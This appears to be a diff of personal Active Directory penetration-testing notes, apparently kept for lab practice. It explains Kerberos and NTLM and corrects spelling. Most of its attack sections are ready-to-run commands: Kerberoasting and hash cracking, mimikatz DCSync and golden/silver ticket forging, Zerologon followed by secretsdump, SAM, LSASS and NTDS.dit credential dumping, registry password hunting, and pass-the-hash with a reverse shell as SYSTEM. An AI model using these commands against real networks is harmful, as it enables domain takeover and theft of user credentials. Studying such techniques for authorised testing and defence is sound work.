@@ -8,6 +8,7 @@ Goal:
 BASICS:
 	Terms:
 		DC => Domain Controller
+		DN => Distinguished Name
 		CN => Common Name
 		CS => Certficate Services
 	AD:(Active Directory)
@@ -115,13 +116,8 @@ BASICS:
 		They simply act as a rulebook for Active  Directory that a domain admin can modify
 	SPN:(Service Principal Name)
 		When applications like Exchange/SQL/IIS are integrated into AD, a unique service instance identifier known as a SPN is used to associate a service on a specific server to a 'service account' in Active Directory.
-		An alternative to attacking a domain user account is to target so-called service accounts, which may also be members of high value groups.
-	Juicy Files:
-		SAM: See Windows_privesc
-		LSA:(Local Security Authority)
-			Its a protected system process that authenticates and logs users on to the local computer. Domain credentials are used by the operating system and authenticated by the Local Security Authority
-		NTDS.dit:
-			New Technologies Directory Services and DIT stands for Directory Information Tree. This file acts as a database for Active Directory and stores all its data including all the credentials.
+		they are an alternative to attacking a domain user account
+	Juicy Files: Covered in Basics on Credential Mining
 	AD in cloud:
 		Azure AD
 	Authenciation In AD:
@@ -133,7 +129,7 @@ BASICS:
 				4. Server forwards the response along with the username and the nonce to the DC
 				5. The validation is then performed by the DC, since it already knows the NTLM hash of all users
 				6. DC encrypts the challenge itself with the NTLM hash of the supplied username and compares it to the response it received from the server. If the two are equal, the authentication request is successful.
-		kerbros:
+		kerberos:
 			A STATELESS protocol to authenticate clients with Application servers(providing services) using tickets(uses symmetric key cryptography(single key used to encrypt and to decrypt))
 				STATELESS:
 					It means each request is executed independently, without any knowledge of the requests that were executed before it, which means once the transaction ends the connection between the browser and the server is also lost.
@@ -141,7 +137,7 @@ BASICS:
 			Layman Explanation:
 				client gets ticket from KDC
 				client gives that ticket to SS to establish connection with service(s).
-			Components of kerbros:
+			Components of kerberos:
 				Players:
 					Client => wants to access some service
 					KDC:(key Distribution Center)
@@ -154,7 +150,7 @@ BASICS:
 							TGS:(Ticket Granting Server)
 				Keys:
 					KRBTGT key:
-						KRBTGT is an account in KDC for managing kerbros and is used to encrypt and sign all tickets in a domain.
+						KRBTGT is an account in KDC for managing kerberos and is used to encrypt and sign all tickets in a domain.
 					user key:
 					service key:
 					session key:
@@ -186,10 +182,10 @@ BASICS:
 						optional
 						used by service to identify itself against user
 					KRB_ERROR: Some ERROR
-			Working of kerbros:
+			Working of kerberos:
 				1. When a user logs in to their workstation, a Authentication Server Request(or AS_REQ)(contains a time stamp that is encrypted using a hash derived from the password of the user and the username.) is sent to the DC,which has the role of KDC and also maintains the Authentication Server service.
 				2. When the DC receives the request, it looks up the password hash associated with the specific user and attempts to decrypt the time stamp. If the decryption process is successful and the time stamp is not a duplicate (a potential replay attack), the authentication is considered successful.
-				3.The DC replies to the client with an Authentication Server Reply (AS_REP) that contains a session key (since kerbros is stateless) and a Ticket Granting Ticket (TGT). 
+				3.The DC replies to the client with an Authentication Server Reply (AS_REP) that contains a session key (since kerberos is stateless) and a Ticket Granting Ticket (TGT). 
 				4. Once the client has received the session key and the TGT, the KDC considers the client authentication complete.
 				5. When the user wishes to access resources of the domain such as a network share, an Exchangemailbox, or some other application with a registered service principal name, it generates a Ticket Granting Service Request (or TGS_REQ) packet that consists of the current user and a timestamp (encrypted using the session key), the SPN of the resource, and the encrypted TGT.
 				6. the ticket granting service on the KDC receives the TGS_REQ, and if the SPN exists in the domain, the TGT is decrypted using the secret key known only to the KDC. The session key is then extracted from the TGT and used to decrypt the username and timestamp of the request.
@@ -312,7 +308,7 @@ Domain Enumeration:
 			it allows password hashes to be retrieved for users that do not require pre-authentication
 			Requirements:
 				List of users in a domain
-				Port 88(kerbros) to be open		
+				Port 88(kerberos) to be open		
 			Attack:
 				Local Way:(when we have shell available)
 					Rubeus.exe:
@@ -352,7 +348,7 @@ Initial Attacks:(to get a user shell)
 				analyse-session.log
 				poisoners-session.log
 		Targeting protocols:
-			SMB/SQL/kerbros/FTP/POP3/IMAP/HTTP(S)/etc
+			SMB/SQL/kerberos/FTP/POP3/IMAP/HTTP(S)/etc
 		how to know if LLMNR is open?
 			nmap --script llmnr-resolve --script-args 'llmnr-resolve.hostname=marvel.local' -e interface
 			msf> use auxiliary/scanner/llmnr/query
@@ -465,8 +461,8 @@ Initial Attacks:(to get a user shell)
 		MITIGATION:
 			enable SMB/LDAP signing on all devices
 				issue => performance issues
-			disable ntlm, use kerbros
-				issue => if kerbros failed, windows automatically goes back to ntlm
+			disable ntlm, use kerberos
+				issue => if kerberos failed, windows automatically goes back to ntlm
 			account tiering
 			local admin restriction
 	IPV6 Attack:(DNS-Takeover Attack)
@@ -488,7 +484,8 @@ Initial Attacks:(to get a user shell)
 			add "administrative users" in "protected users" group+
 POST-Enumeration:
 	Note:
-		In HTB, we have just one box and we assume it as domain/DC. But its not real life as in real life, we have a domain have main DC, other DC's and many other computer devices, each one of them having both unique and shared users and groups. So, Here, i will make notes for Real-Life AD pentesting.
+		In HTB, we have just one box and we assume it as domain/DC. But its not real life as in real life, we have:
+			A forest, having many trees and each of those trees have multiple domains with each domain having a primary DC and many secondary DC's and many other computer devices, each one of them having both unique and shared users and groups. So, Here, i will make notes for Real-Life AD pentesting.
 	Manual Enumeration:(Important)
 		To know available systems in a domain:
 			net view => shows a list of computers (their hostname)
@@ -579,31 +576,31 @@ POST-Enumeration:
 			Script to enumerate nested groups:
 				Nested Groups are those which contains groups inside them along with users
 	If we have Pass/Hash:
-		GetADUsers.py:
+		GetADUsers.py:(impacket)
 			User Enumeration
 			GetADUsers.py -all -dc-ip ip domain.local/username:password
 	Automated Enumeration:(scripts)
-		First try Windows Privsec scripts, then try powerview or bloodhound
+		First try manual AD enumeration 
+		then try Windows Privsec scripts
+		then try powerview 
+		then try bloodhound
 		Powerview:(github)
+			This script is full of great modules for AD
 			usage:
-				cmd> powershell -ep bypass
-				PS> Import-Module ./powerview.ps1
-				now we can load modules
-				ps> module-name => list modules
-				modules:
-					get-netdomain => info about domain
-					get-netdomaincontroller => info about DC
-					get-domainpolicy => show policies
-					(get-domainpolicy)."policyname" => info about policy
-					get-netuser => all users of domain
-					get-netgpo => show group policies
-					Get-NetLoggedon -ComputerName name => show currently loggedin users in a computer
-					Get-NetSession -ComputerName name => same as Get-NetLoggedon
+				powershell -ep bypass
+				Import-Module ./powerview.ps1
+				module-name => list modules
+				Modules for Enumeration:
+					Get-NetLoggedon -ComputerName name:
+						As explained earlier, we can get list of computers joined to domain via manual privesc. Once done, we can use this command with the computer_name to show currently loggedin users in that computer
 					See GITHUB page for more options
+				Modules for Exploitation:					
+					Note:
+						Bloodhound uses powerview modules to suggest privesc path
 		Bloodhound:(v.imp tool)
 			Installation:
 				apt-get install bloodhound
-			it is a tool to visualize all the data in AD and provides method for privesc on basis of data collected
+			it is a tool to visualize all the data in AD and provides method for privesc(via PowerView Modules) on basis of data collected
 			Collectors:
 				in order to use Bloodhound, we need to provide data which we collect using Collectors
 				Download:
@@ -657,7 +654,6 @@ POST-Enumeration:
 						Find Principles with DCSync Rights
 POST-Exploitation:
 	token impersonation => same as that of windows privesc
-	Credentials mining: see Windows Privesc sheet
 	GPP:(MS14-025)
 		It allowed admins to create Domain Policies using embedded credentials. These credentials were encrypted using a secret key (AES) and placed in "cPASSWORD" file in Groups.xml. Groups.xml can be read by can user.
 		\\[Domain Controller]\SYSVOL\[Domain]\Policies\Groups.xml
@@ -691,10 +687,11 @@ POST-Exploitation:
 			python3 set_empty_pw.py domain.local dc_ip => makes password empty string
 			python3 secretsdump.py -just-dc domain/hostname\$@ip => give me domain admin hash
 			wmiexec.py domain/Administrator@ip -hashes hash
-	Kerbros Based Attacks:(requires port 88(kerbros) to be open)
+	kerberos Based Attacks:(requires port 88(kerberos) to be open)
 		How to know which tickets we have:
 			Using mimikatz:(We need ADMIN shell on DC)
-				kerbros::list /export
+				kerberos::list => List all user tickets (both TGT and TGS) in user memory
+				Read in mimikitaz section for more details
 		Kerberoasting:(imp)
 			The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts as part of these TGS tickets are encrypted with keys derived from user passwords.
 			The creds of these Service Accounts could be cracked offline.
@@ -704,58 +701,57 @@ POST-Exploitation:
 				Remote Way:
 					getuserspns.py:(part of impacket toolkit)
 						getuserspns.py domain_name/user:pass -dc-ip <ip> -request
-							this will get us hash
-						hashcat -m 13100 hash.txt rockyou.txt
+							this will get us hash for .kirbi ticket
+						crack it as defined below
 				Local Way:(when we have shell available)
 					mimikatz:
-						kerbros::list => SPN discovery
-						kerbros::list /export => it will export tickets as .kirbi
+						kerberos::list => List all user tickets (both TGT and TGS) in user memory
+						kerberos::list /export => export user tickets to .kirbi files
+							we should use "sekurlsa::tickets /export" instead of this as there are circumstances where the user certificates won’t export
 						move .kirbi file to kali
-						kirbi2jhon file.kirbi > kerb.john
-						john --format=krb5tgs --wordlist=rockyou.txt hash.txt
-			Cracking .kirbi files:
-				1. hashcat -m 13100 hash.txt rockyou.txt
-				2. john --format=krb5tgs --wordlist=rockyou.txt hash.txt
-				3. ./tgsrepcrack.py rockyou.txt file.kirbi
-					https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py
+						crack it as defined below
+						Read in mimikitaz section for more details
+				Cracking .kirbi files:
+					1. hashcat -m 13100 hash.txt rockyou.txt
+					2. Using john:
+						kirbi2jhon ticket.kirbi > kerb.john
+						john --format=krb5tgs --wordlist=rockyou.txt kerb.john
+					3. ./tgsrepcrack.py rockyou.txt file.kirbi
+						https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py
 		Pass The Ticket:(PTT)
-			The major difference between the Pass-the-Ticket and Pass-the-Hash attack is that the kerbros TGT tickets(pass the ticket) have an expiration time of 10 hours (can be changed) and in Pass-The-Hash there is no expiration time.
+			Here, we pass the ticket (.kirbi file)
 			mimikatz:(we need admin shell on DC)
-				kerbros::list => list all tickets
-				kerbros::list /export => it will export tickets as .kirbi
-				kerbros::ptt ticketname.kirbi => load ticket
-				misc::cmd => get shell from loaded ticket
+				kerberos::list => List all user tickets (both TGT and TGS) in user memory
+				kerberos::list /export => export user tickets to .kirbi files
+					we should use "sekurlsa::tickets /export" instead of this as there are circumstances where the user certificates won’t export
+				kerberos::ptt ticket.kirbi => pass the ticket
+				Read in mimikitaz section for more details
 		Golden Ticket:(its a type of PTT)
-			In this attack, an attacker forges kerbros TGT by compromising krbtgt account. TGTs are used when requesting TGS tickets, which means a forged TGT can get us any TGS ticket - hence it's golden.
+			In this attack, an attacker forges kerberos TGT by compromising krbtgt account. TGTs are used when requesting TGS tickets, which means a forged TGT can get us any TGS ticket - hence it's golden.
 			In this attack, we dont crack any hash.
 			Requirements:
+				Domain Name
 				KRBTGT NTLM:
 					This attack assumes that DC has been compromised, and KRBTGT account hash can thus, be extracted
-				Domain Name
 				SID:
 					c:\> whoami /user
 					it will give sid but the last part of it is RID.
 			Attack:
 				Using mimikatz:(We need ADMIN shell on DC)			
-					Obtaining NTLM hash of krbtgt account:
-						4 Ways:
-							1. mimikatz:dcsync(We need ADMIN shell on DC)(imp)
+					1. Obtain NTLM hash of krbtgt account:
+						2 Ways:
+							1. mimikatz's dcsync module:
 								lsadump::dcsync /domain:domain.local /user:krbtgt
-								DCSync feature tries to impersonate a DC
 								This technique is less noisy as it doesn’t require direct access to the DC
-							2. mimikatz:LSA(We need ADMIN shell on DC)
-								lsadump::lsa /inject /name:krbtgt				
-							3. Hashdump:(meterpreter)
-							4. Kiwi:(meterpreter)
-								Covered later
-					Creating a golden ticket:
-						kerbros::golden /domain:domain.local /sid:value /rc4:NTLM /user:user1234 /id:500
-							user => any username
-							sid => sid of current user 
-							id => RID of account you will be impersonating. ID of default administrator is 500
-						it will create a golden ticket "ticket.kirbi"
-					Using the golden ticket in current session:(Loading it into memory)
-						kerbros::ptt ticket.kirbi
+							2. mimikatz's lsadump module:
+								lsadump::lsa /inject /name:krbtgt
+					2. Create a golden ticket:
+						kerberos::golden /domain:domain.local /sid:value /rc4:NTLM /user:user1234 /id:500 /ticket:ticket.kirbi 
+							This will create a golden ticket "ticket.kirbi"
+					3. Use the golden ticket in current session by loading it into memory:(Pass The Ticket)
+						kerberos::ptt ticket.kirbi => pass the ticket
+					Note:	
+						Read in mimikitaz section for more details
 				Using meterpreter:
 					load kiwi
 					dcsync_ntlm krbtgt
@@ -772,8 +768,9 @@ POST-Exploitation:
 				google
 			Attack:
 				Using mimikatz:(We need ADMIN shell on DC)
-					kerbros::golden /sid:domain_sid /domain:domain.local /target:service_host:port /service:service_name /rc4:NTLM /user:user1234 /ptt
+					kerberos::golden /domain:domain.local /sid:domain_sid /target:service_host:port /service:service_name /rc4:NTLM /user:user1234 /ptt
 						/ptt => loads the ticket into memory after creating it
+					Read in mimikitaz section for more details
 				Using the ticket depends on which service we have compromised:
 					https://pentest.racko.sk/active-directory/persistence/silver-ticket
 		OverPass-the-Hash:(pass the key)
@@ -809,21 +806,152 @@ POST-Exploitation:
 				$pass = Convertto-securestring 'password' -AsPlainText -Force 
 				$cred = New-Object System.Management.Automation.PSCredential('domain\username'.$pass)
 				Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity username -Rights DCSync
-	Dumping NTDS.dit:
-		DCSYNC Attack:
+	Credentials mining:(important part in privesc)
+		Basics:
+			LSA:(Local Security Authority)
+				Its a protected system process that authenticates and logs users on to the local computer. Domain credentials are used by the operating system and authenticated by the Local Security Authority
+			NTDS.dit:
+				New Technologies Directory Services and DIT stands for Directory Information Tree. This file acts as a database for Active Directory and stores all its data including all the credentials.
+			SAM(security accounts manager):(c:\windows\system32\config\SAM)
+				Database having user accounts with hashed passwords
+				Hash_format:
+					username:useris:lan_manager_hash:NTLM_hash
+					NTLM(NT LAN Manager):MD4
+					LM Hash:DES Encryption
+			SYSTEM:
+			SECURITY:
+			lssas:
+				After a user logs on, a variety of credentials are generated and stored in the Local Security Authority Subsystem Service(LSASS), a process in memory.
+				This is meant to facilitate single sign-on (SSO) ensuring a user isn’t prompted each time resource access is requested.
+				The credential data may include Kerberos tickets, NTLM password hashes, LM password hashes (if the password is < 15 characters), and clear-text passwords (to support WDigest and SSP authentication among others. 
+			Windows Vault:(Credential Manager)	
+				stores credentials using which Windows log in the users automatically, which means that any Windows application that needs credentials to access a resource can make use of CWindows Vault and use the credentials supplied instead of users entering the username and password all the time.		
+		Dumping NTDS.dit:
+			aka DCSYNC Attack
 			used in HTB::sauna
 			Secretsdump.py:
 				dumps hashes of SAM/LSA/DPAPI/other stuff
 				Remotely:
 					Secretsdump.py domain/user@ip -hashes => using lm hash
 					secretsdump.py domain/user:pass@ip => using pass
-					we need admin creds to dump ntds.dit
+					Note:
+						we need admin creds to dump ntds.dit
 				Locally:
+					secretsdump -system SYSTEM -ntds ntds.dit local
 					It means we provide ntds.dit and SYSTEM file (in case of AD)
-						secretsdump -system SYSTEM -ntds ntds.dit local`
+		Dumping Sam file:
+			dumping windows hashes using registery hives:
+				C:\> mkdir temp
+				C:\> reg.exe save hklm\sam c:\temp\sam.save
+				C:\> reg.exe save hklm\security c:\temp\security.save
+				C:\> reg.exe save hklm\system c:\temp\system.save
+				tranfer these using smbserver
+				secretsdump.py -sam sam.save -security security.save -system system.save LOCAL => gives ntlm hashes
+			mimikatz.exe: Shown below
+			meterpreter:
+				hashdump
+			samdump2 SYSTEM SAM
+		Cracking ntlm hashes:
+			https://samsclass.info/123/proj10/px16-hashcat-win.htm
+			hashcat -m 1000 -a 0 -o out.txt hashes.txt wordlist.txt
+		Memory Credentials mining:(aka Cached Credentials)
+			these hashes are stored in the Local Security Authority Subsystem Service (LSASS)
+			Procdump.exe:(sysinternals tool)
+				Its used to dump processes in memory, Services like FTP have credentials in clear text in memory.So, we can dump memory and read the credentials.
+				procdump.exe -accepteula -ma lsass.exe lsass.dmp
+				copy dump file to local windows machine of same arch
+			WCE:(Windows Credential Editor)
+				It allows to list windows logon sessions and add/delete/change/list associated crentials(LM/NT hash,kerberos tickets, passwords)
+				wce -l => list logon sessions and hashes
+				wce -w => to dump clear text passwords
+				issue:
+					can easily invoke antivirus/windows_defender
+			mimikatz.exe: Shown below
+			Note:
+				we need admin privileges to run both WCE and mimikatz
+			Note:
+				winpeas do it automatically 
+		Password hunting from strings:
+			Note:
+				winpeas do it automatically 
+			Manual:
+				findstr /si password *.txt *.ini *.config
+				dir /s *pass* == *cred* == *vnc* == *.config*
+				Searching in Registry Keys:
+					Passwords:
+						reg query HKLM /f password /t REG_SZ /s
+						reg query HKCU /f password /t REG_SZ /s
+					SSH keys:	
+						SSH private keys can be stored inside the registry key "HKCU\Software\OpenSSH\Agent\Keys"
+						reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
+						once found, they can be decrypted using:
+							https://github.com/ropnop/windows_sshagent_extract
+		mimikatz:
+			It is used to grab passwords from memory, dump SAM/NTDS/LSASS and exploit kerberos authenciation
+			mimikatz.exe:
+				privilege::debug => To enable Administrator privileges
+				token::elevate => To enable SYSTEM privileges
+				lsadump module:
+					It interacts with the Windows LSA (not LSASS) to extract credentials.
+					lsadump::sam => dump SAM
+					lsadump::dcsync /domain:domain.local /user:user_name_or_id  => to get NTLM hash of user
+						can be used to grab hash of krbtgt account
+					lsadump::lsa /inject /name:user_name => to get NTLM hash of user
+						/inject – Inject LSASS to extract credentials
+						can be used to grab hash of krbtgt account
+				sekurlsa module:
+					It extracts passwords, keys, pin codes, tickets from the memory of lsass	
+					sekurlsa::minidump c:\users\whoami\desktop\lsass.dmp => dump lsass
+						copy dump file to local windows machine of same arch
+					sekurlsa::logonPasswords full => to dump the credentials of all logged-on users
+					sekurlsa::tickets => Lists Kerberos tickets for all authenticated users, including services running under the context of a user account
+					sekurlsa::tickets /export => this will export tickets in .kirbi format
+					sekurlsa::pth /user:user /domain:domain.local /ntlm:hash /run:command => pass the hash
+						command can be "C:\WINDOWS\system32\cmd.exe ./shell.exe" => resulting in reverse shell as SYSTEM
+				kerberos module:
+					Its used to interact with official Microsoft Kerberos API. It dont require privileges.
+					kerberos::list => List all user tickets (both TGT and TGS) in user memory
+					kerberos::list /export => export user tickets to .kirbi files
+						we should use "sekurlsa::tickets /export" instead of this as there are circumstances where the user certificates won’t export
+					kerberos::ptt ticket.kirbi => pass the ticket
+					kerberos::golden => create golden/silver/trust tickets
+						kerberos::golden /domain:domain.local /sid:value /rc4:NTLM /user:user1234 /id:500 /ticket:ticket.kirbi => Golden Ticket
+							This will create a golden ticket "ticket.kirbi"
+						kerberos::golden /domain:domain.local /sid:domain_sid /target:service_host:port /service:service_name /rc4:NTLM /user:user1234 /ptt => Silver Ticket
+							/domain => domain.local
+							/sid => sid of current user 
+							/user => username (can be anything)
+							/id => Its optional. RID of account you will be impersonating. Default is 500(RID of administrator)
+							/ticket => Its optional. provide a name and path to save the ticket
+							/ptt => Its optional. loads the ticket into memory immediately after creating it (its an alternative to /ticket)
+							/rc4:
+								in case of golden ticket, we pass NTLM hash of krbtgt account
+								in case of silver ticket, we pass NTLM hash of the service we are attacking					
+							flags for only silver ticket:
+								/target => the target server’s FQDN.
+								/service => the kerberos service running on the target server which we want to attack
+			One-liner for mimikitaz.exe:
+				.\mimikitaz "command1" "command 2" exit
+				.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
+				Note:
+					we used "mimikitaz", not "mimikitaz.exe"
+			Invoke-Mimikatz:(https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)
+				Invoke-Mimikatz -DumpCreds => to dump credentials out of LSASS
+				Invoke-Mimikatz –DumpCerts => to export all private certificates (even if they are marked non-exportable)
+			Note:
+				mimikatz is arch-dependent and has two versions available, x86 and x64.
+			Note:
+				we need admin privileges to run mimikatz
+		Once we get the creds:
+			If we have hash:
+				pass-the-hash => Read below
+			If we have cleartext creds:
+				pass-the-password => Read below
 	Pass The Password:(PTP)
 		winexe:
 			winexe -U 'domain/user%pass' //ip 'cmd.exe /c command'
+			winexe -U 'admin%pass' //ip 'cmd.exe /c command' => gives admin shell
+			winexe -U 'admin%pass' --system //ip 'cmd.exe /c command' => gives system shell
 		psexec:
 			psexec user:pass@ip
 	Pass The Hash:(PTH)
